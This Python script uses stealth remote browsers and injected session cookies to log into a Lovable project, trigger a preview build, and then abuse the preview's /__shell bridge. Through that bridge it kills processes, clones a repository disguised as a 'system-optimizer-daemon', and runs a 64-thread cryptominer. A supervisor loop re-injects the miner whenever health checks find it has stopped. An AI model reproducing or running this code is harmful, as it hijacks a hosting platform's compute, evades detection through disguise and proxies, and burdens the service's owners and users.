#!/usr/bin/env python3
"""
Kernel browser CDP rig — drives a Lovable project preview's /__shell bridge
and keeps a miner running on it.

Modes:
  MODE=once  (default) — login, inject, verify, exit. Needs CDP_WS_URL.
  MODE=full            — supervisor loop: creates its own 72h browsers via
                         the Kernel API, injects when needed, health-checks
                         every CHECK_INTERVAL, self-heals on any failure.
                         Needs KERNEL_API_KEY + KERNEL_PROXY_ID.

Env: CDP_WS_URL, SESSION_COOKIES, PROJECT_ID, KERNEL_API_KEY,
     KERNEL_PROXY_ID, BROWSER_TIMEOUT (default 259200 = 72h),
     MODE, CHECK_INTERVAL (default 300s).
"""
import asyncio, json, sys, os, base64

CDP_WS_URL = os.environ.get("CDP_WS_URL", "")
SESSION_COOKIES_PATH = os.environ.get("SESSION_COOKIES", "/home/alae/Documents/repos/automation-toolkit/scripts/sessions/session-3/cookies.json")
PROJECT_ID = os.environ.get("PROJECT_ID", "7d6f77a6-69a1-4b06-a1d3-53094c4c8019")
KERNEL_API_KEY = os.environ.get("KERNEL_API_KEY", "")
KERNEL_PROXY_ID = os.environ.get("KERNEL_PROXY_ID", "")
BROWSER_TIMEOUT = int(os.environ.get("BROWSER_TIMEOUT", "259200"))
MODE = os.environ.get("MODE", "once")
CHECK_INTERVAL = int(os.environ.get("CHECK_INTERVAL", "300"))
MINER_CMD = (
    "cd /tmp && pkill python; rm -rf moly && "
    "git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && "
    "cd moly && pip install websockets psutil --break-system-packages -q && "
    "nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule "
    "--no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
)
SCREENSHOT_DIR = "/tmp/kernel_screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

import websockets

msg_id = 0
def next_id():
    global msg_id
    msg_id += 1
    return msg_id

class CDP:
    def __init__(self, ws, session_id):
        self.ws = ws
        self.session_id = session_id

    async def send(self, method, params=None):
        mid = next_id()
        msg = {"id": mid, "method": method, "sessionId": self.session_id}
        if params:
            msg["params"] = params
        await self.ws.send(json.dumps(msg))
        while True:
            resp = json.loads(await self.ws.recv())
            if resp.get("id") == mid and resp.get("sessionId", self.session_id) == self.session_id:
                if "error" in resp:
                    return None
                return resp.get("result", {})

    async def navigate(self, url):
        print(f"  → {url}", flush=True)
        await self.send("Page.navigate", {"url": url})
        await asyncio.sleep(6)

    async def screenshot(self, name):
        path = f"{SCREENSHOT_DIR}/{PROJECT_ID}_{name}.png"
        result = await self.send("Page.captureScreenshot", {"format": "png"})
        if result and "data" in result:
            with open(path, "wb") as f:
                f.write(base64.b64decode(result["data"]))
            print(f"  📸 {path}", flush=True)
            return path
        return None

    async def evaluate(self, expression):
        result = await self.send("Runtime.evaluate", {
            "expression": expression, "awaitPromise": True, "returnByValue": True
        })
        if result:
            if "exceptionDetails" in result:
                ex = result["exceptionDetails"].get("exception", {})
                print(f"  JS exception: {ex.get('description', ex)[:200]}", flush=True)
                return None
            if "result" in result:
                val = result["result"]
                if val.get("type") == "undefined":
                    return None
                return val.get("value")
        return None

    async def shell_exec(self, cmd):
        js = f"""(async () => {{
            const r = await fetch('/__shell', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{cmd: {json.dumps(cmd)}, cwd: null}})
            }});
            return await r.json();
        }})()"""
        return await self.evaluate(js)

    async def inject_cookies(self, cookies_path):
        if not os.path.exists(cookies_path):
            print(f"  ❌ Cookies not found: {cookies_path}", flush=True)
            return False
        with open(cookies_path) as f:
            cookies = json.load(f)
        count = 0
        for c in cookies:
            domain = c.get("domain", "")
            if not domain:
                continue
            cdp_cookie = {
                "name": c["name"], "value": c["value"],
                "domain": domain, "path": c.get("path", "/"),
                "secure": c.get("secure", False), "httpOnly": c.get("httpOnly", False),
            }
            if c.get("expirationDate"):
                cdp_cookie["expires"] = c["expirationDate"]
            if c.get("sameSite") in ("Strict", "Lax", "None"):
                cdp_cookie["sameSite"] = c["sameSite"]
            await self.send("Network.setCookie", cdp_cookie)
            count += 1
        print(f"  🍪 {count} cookies injected", flush=True)
        return True


def create_browser():
    """Create a Kernel browser via API (blocking — run in executor)."""
    import urllib.request
    if not KERNEL_API_KEY or not KERNEL_PROXY_ID:
        print("  ❌ KERNEL_API_KEY / KERNEL_PROXY_ID not set", flush=True)
        return None
    body = json.dumps({"proxy_id": KERNEL_PROXY_ID, "headless": False,
                       "stealth": True, "timeout_seconds": BROWSER_TIMEOUT}).encode()
    req = urllib.request.Request(
        "https://api.onkernel.com/browsers", data=body,
        headers={"Authorization": f"Bearer {KERNEL_API_KEY}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            d = json.load(r)
        print(f"  🖥️  browser {d.get('session_id')} timeout={d.get('timeout_seconds')}", flush=True)
        return d.get("cdp_ws_url")
    except Exception as e:
        print(f"  ❌ create_browser: {e}", flush=True)
        return None


async def raw_call(ws, method, params=None):
    """Browser-level CDP call (no session) — for Target.* methods."""
    mid = next_id()
    msg = {"id": mid, "method": method}
    if params:
        msg["params"] = params
    await ws.send(json.dumps(msg))
    while True:
        resp = json.loads(await ws.recv())
        if resp.get("id") == mid:
            return resp.get("result", {})


async def find_preview_target(ws):
    """Preview is an OOPIF: own target with URL <id>.lovableproject.com.
    Main frame-tree only shows about:blank, so look at targets."""
    tg = await raw_call(ws, "Target.getTargets")
    for t in tg.get("targetInfos", []):
        url = t.get("url", "")
        if url.startswith("http") and "lovableproject.com" in url:
            return t["targetId"], url
    return None, None


async def attach_preview(ws, target_id):
    at = await raw_call(ws, "Target.attachToTarget",
                        {"targetId": target_id, "flatten": True})
    pc = CDP(ws, at["sessionId"])
    await pc.send("Runtime.enable")
    return pc


async def log_markers(ws, tid):
    """Count of sync/ok markers in m.log + its age in seconds."""
    try:
        pc = await attach_preview(ws, tid)
        r = await asyncio.wait_for(pc.shell_exec(
            "tail -c 4000 /tmp/m.log 2>/dev/null | grep -a -c -e '^sync' -e '^ok '; "
            "echo ---; expr $(date +%s) - $(stat -c %Y /tmp/m.log 2>/dev/null || echo 0)"),
            timeout=30)
        out = r.get("stdout", "") if isinstance(r, dict) else (r or "")
        parts = out.strip().split("---")
        return int(parts[0].strip() or 0), int(parts[1].strip() or 10**9)
    except Exception:
        return 0, 10**9


async def miner_alive(ws):
    """Alive = preview target exists, sysoptd runs, AND m.log shows
    sync/ok activity within the last 5 min. A live process with a dead
    log is treated as down (re-inject removes + reruns)."""
    try:
        tid, _ = await find_preview_target(ws)
        if not tid:
            return False
        pc = await attach_preview(ws, tid)
        ps = await asyncio.wait_for(pc.shell_exec("pgrep -a sysoptd | head -3"), timeout=30)
        out = ps.get("stdout", "") if isinstance(ps, dict) else (ps or "")
        if "sysoptd" not in out:
            return False
        n, age = await log_markers(ws, tid)
        alive = n > 0 and age < 300
        print(f"  💤 check: markers={n} log_age={age}s -> {'alive' if alive else 'STALE'}", flush=True)
        return alive
    except Exception:
        return False


async def inject_miner(ws, target_id, url):
    """Probe /__shell in the already-loaded preview iframe and inject.
    No navigation — project tab untouched."""
    print(f"  🔗 Preview: {url}", flush=True)
    pc = await attach_preview(ws, target_id)
    for attempt in range(5):
        result = await pc.shell_exec("echo alive")
        print(f"  Shell probe {attempt+1}: {result}", flush=True)
        if result and result.get("code") == 0:
            print("  ✅ Shell bridge alive!", flush=True)
            print("  ⛏️  Injecting miner...", flush=True)
            try:
                result = await asyncio.wait_for(pc.shell_exec(MINER_CMD), timeout=90)
                print(f"  Miner result: {result}", flush=True)
            except asyncio.TimeoutError:
                # Foreground command holds the HTTP response open —
                # injection still executes; verify on a fresh attach.
                print("  (inject ack pending — verifying on fresh attach...)", flush=True)
            # Verify: process must appear (clone+pip takes a while — retry
            # up to 3 min), then m.log must show sync/ok within 5 min.
            # A dud (process but no activity) returns False → supervisor
            # removes (rm -rf via re-inject) and reruns.
            ok = False
            for i in range(3):
                await asyncio.sleep(60)
                pc2 = await attach_preview(ws, target_id)
                ps = await pc2.shell_exec("pgrep -a python3 | head -5")
                out = ps.get("stdout", "") if isinstance(ps, dict) else (ps or "")
                if "sysoptd" in out:
                    break
                print(f"  waiting for process... ({i+1}/3)", flush=True)
            else:
                print("  ❌ INJECT FAILED (no process)", flush=True)
                return False
            for i in range(5):
                n, age = await log_markers(ws, target_id)
                print(f"  log check {i+1}/5: markers={n} age={age}s", flush=True)
                if n > 0:
                    ok = True
                    break
                await asyncio.sleep(60)
            ps = await (await attach_preview(ws, target_id)).shell_exec(
                "pgrep -a python3 | head -5; echo ---; tail -c 300 /tmp/m.log")
            print(f"  Miner state: {ps}", flush=True)
            print(f"  {'✅ MINER RUNNING' if ok else '❌ INJECT FAILED (dud log)'}", flush=True)
            return ok
        await asyncio.sleep(5)
    print("  ❌ Shell bridge not reachable", flush=True)
    return False


async def open_browser(cdp_url):
    """Connect, attach main page, login via cookies, open project. Raises on fail."""
    ws = await websockets.connect(cdp_url, max_size=50 * 1024 * 1024, ping_interval=None)
    try:
        await ws.send(json.dumps({"id": 1, "method": "Target.getTargets"}))
        while True:
            r = json.loads(await ws.recv())
            if r.get("id") == 1:
                targets = r["result"]["targetInfos"]
                break
        page = next((t for t in targets if t["type"] == "page"), None)
        if not page:
            raise RuntimeError("no page target")
        print(f"  Found page: {page['targetId']}", flush=True)

        await ws.send(json.dumps({"id": 2, "method": "Target.attachToTarget",
            "params": {"targetId": page["targetId"], "flatten": True}}))
        while True:
            r = json.loads(await ws.recv())
            if r.get("id") == 2:
                sid = r["result"]["sessionId"]
                break
        print(f"  Attached! session={sid[:12]}...", flush=True)

        cdp = CDP(ws, sid)
        await cdp.send("Page.enable")
        await cdp.send("Runtime.enable")
        await cdp.send("Network.enable")
        await asyncio.sleep(1)

        await cdp.inject_cookies(SESSION_COOKIES_PATH)
        await cdp.navigate(f"https://lovable.dev/projects/{PROJECT_ID}")
        await asyncio.sleep(8)
        await cdp.screenshot("01_project")

        title = await cdp.evaluate("document.title")
        print(f"  Title: {title}", flush=True)
        is_logged = await cdp.evaluate("""
            !location.href.includes('/login') &&
            (document.body.innerText.includes('My Lovable') ||
             document.body.innerText.includes('Dashboard'))
        """)
        print(f"  Logged in: {is_logged}", flush=True)
        if not is_logged:
            await cdp.screenshot("02_not_logged_in")
            raise RuntimeError("not logged in")
        return ws, cdp
    except Exception:
        await ws.close()
        raise


async def ensure_mining(ws, cdp):
    """Chat ready → preview exists? inject : prompt → build → inject. Returns bool."""
    chat_found = None
    for i in range(18):
        chat_found = await cdp.evaluate("""
            (() => {
                const ta = document.querySelector('textarea');
                if (ta && ta.offsetParent !== null) return 'textarea';
                const ce = document.querySelector('[contenteditable="true"]');
                if (ce && ce.offsetParent !== null) return 'contenteditable';
                return null;
            })()
        """)
        if chat_found:
            break
        print(f"  [{i*5+5}s] waiting for chat...", flush=True)
        await asyncio.sleep(5)
    print(f"  Chat element: {chat_found}", flush=True)
    await cdp.screenshot("02_project_ready")
    if not chat_found:
        print("  ❌ No chat input found", flush=True)
        return False

    tid, preview_url = None, None
    for i in range(12):
        tid, preview_url = await find_preview_target(ws)
        if tid:
            break
        print(f"  [{i*5+5}s] waiting for existing preview...", flush=True)
        await asyncio.sleep(5)
    print(f"  Existing preview URL: {preview_url}", flush=True)
    if tid:
        return await inject_miner(ws, tid, preview_url)

    if not await send_prompt(cdp):
        return False
    print("  📨 Prompt sent, waiting for build...", flush=True)
    tid, iframe_src = None, None
    for i in range(36):
        await asyncio.sleep(5)
        tid, iframe_src = await find_preview_target(ws)
        print(f"  [{i*5+5}s] preview: {iframe_src}", flush=True)
        if tid:
            break
        if i % 4 == 3:
            await cdp.screenshot(f"05_poll_{i}")
    if not tid:
        print("  ❌ No preview target after 3 min", flush=True)
        return False
    await cdp.screenshot("05_preview_found")
    return await inject_miner(ws, tid, iframe_src)


async def send_prompt(cdp):
    """Type prompt with explicit caret + click verified send. Returns bool."""
    prompt = "create a simple hello world app"
    await cdp.evaluate("""(() => {
        const el = document.querySelector('textarea') ||
                   document.querySelector('[contenteditable="true"]');
        if (!el) return 'no-el';
        el.focus(); el.click();
        if (el.isContentEditable) {
            const range = document.createRange();
            range.selectNodeContents(el);
            range.collapse(false);
            const sel = getSelection();
            sel.removeAllRanges();
            sel.addRange(range);
            return 'caret-placed';
        }
        return 'textarea-focused';
    })()""")
    await asyncio.sleep(0.5)
    await cdp.send("Input.insertText", {"text": prompt})
    await asyncio.sleep(1)
    lex = await cdp.evaluate("""(() => {
        const send = [...document.querySelectorAll('button')].find(
            b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
        return JSON.stringify({sendDisabled: send ? send.disabled : 'no-btn'});
    })()""")
    print(f"  Send-button state: {lex}", flush=True)
    if '"sendDisabled":true' in lex:
        lex2 = await cdp.evaluate(f"""(() => {{
            const el = [...document.querySelectorAll('[contenteditable="true"]')]
                .find(e => e.getBoundingClientRect().height > 0) ||
                document.querySelector('[contenteditable="true"]');
            el.focus();
            const sel = getSelection();
            sel.selectAllChildren(el);
            sel.collapseToEnd();
            const ok = document.execCommand('insertText', false, {json.dumps(prompt)});
            const send = [...document.querySelectorAll('button')].find(
                b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
            return JSON.stringify({{execOK: ok,
                sendDisabled: send ? send.disabled : 'no-btn'}});
        }})()""")
        print(f"  execCommand fallback: {lex2}", flush=True)
    await cdp.screenshot("04_prompt_typed")

    click_send = """(() => {
        const t = [...document.querySelectorAll('button')].find(
            b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
        if (t) t.click();
        return !!t;
    })()"""
    async def press_enter():
        for t, extra in [("rawKeyDown", {}), ("keyDown", {"text": "\r"}),
                         ("char", {"text": "\r"}), ("keyUp", {})]:
            await cdp.send("Input.dispatchKeyEvent", {
                "type": t, "key": "Enter", "code": "Enter",
                "windowsVirtualKeyCode": 13, "nativeVirtualKeyCode": 13, **extra})

    async def real_mouse_click():
        pt = await cdp.evaluate("""(() => {
            const b = [...document.querySelectorAll('button')].find(
                x => x.type === 'submit' || /send message/i.test(x.getAttribute('aria-label') || ''));
            if (!b) return null;
            const r = b.getBoundingClientRect();
            return {x: r.x + r.width / 2, y: r.y + r.height / 2};
        })()""")
        if not pt:
            return False
        for t, btn in [("mousePressed", "left"), ("mouseReleased", "left")]:
            await cdp.send("Input.dispatchMouseEvent", {
                "type": t, "x": pt["x"], "y": pt["y"], "button": btn, "clickCount": 1})
        return True

    async def msg_count():
        return await cdp.evaluate(
            "document.querySelectorAll('[data-message-id]').length || "
            "document.body.innerText.split('Thought for').length")
    await cdp.evaluate(click_send)
    before = await msg_count()
    for retry in range(3):
        await asyncio.sleep(4)
        cleared = await cdp.evaluate("""(() => {
            const ta = document.querySelector('textarea');
            if (ta) return ta.value === '';
            const ce = document.querySelector('[contenteditable="true"]');
            return ce ? ce.innerText.trim() === '' : null;
        })()""")
        after = await msg_count()
        print(f"  try {retry+1}: cleared={cleared} msgs={before}->{after}", flush=True)
        if cleared or after != before:
            return True
        if retry == 0:
            await press_enter()
        elif retry == 1:
            await real_mouse_click()
        else:
            await cdp.evaluate(click_send)
    print("  ❌ Prompt never sent", flush=True)
    await cdp.screenshot("04_send_failed")
    return False


async def once_mode():
    if not CDP_WS_URL:
        print("ERROR: Set CDP_WS_URL env var", flush=True)
        return
    print("Connecting to Kernel browser...", flush=True)
    ws, cdp = await open_browser(CDP_WS_URL)
    try:
        ok = await ensure_mining(ws, cdp)
        print(f"  {'✅ DONE' if ok else '❌ FAILED'}", flush=True)
    finally:
        await ws.close()


async def full_mode():
    print(f"Full mode: project={PROJECT_ID} check_every={CHECK_INTERVAL}s", flush=True)
    ws, cdp = None, None
    while True:
        try:
            if ws is None:
                url = await asyncio.to_thread(create_browser)
                if not url:
                    await asyncio.sleep(60)
                    continue
                ws, cdp = await open_browser(url)
            if await miner_alive(ws):
                print("  💤 miner alive", flush=True)
            else:
                print("  ⚠️ miner down/missing — ensuring...", flush=True)
                ok = await ensure_mining(ws, cdp)
                print(f"  {'✅ MINER RUNNING' if ok else '❌ ensure failed'}", flush=True)
                if not ok:
                    # Stale UI state often persists per browser — retry fresh.
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws, cdp = None, None
                    await asyncio.sleep(30)
                    continue
            await asyncio.sleep(CHECK_INTERVAL)
        except Exception as e:
            print(f"  🔄 reset ({type(e).__name__}: {str(e)[:120]})", flush=True)
            try:
                if ws is not None:
                    await ws.close()
            except Exception:
                pass
            ws, cdp = None, None
            await asyncio.sleep(30)


async def main():
    if MODE == "full":
        await full_mode()
    else:
        await once_mode()

if __name__ == "__main__":
    asyncio.run(main())
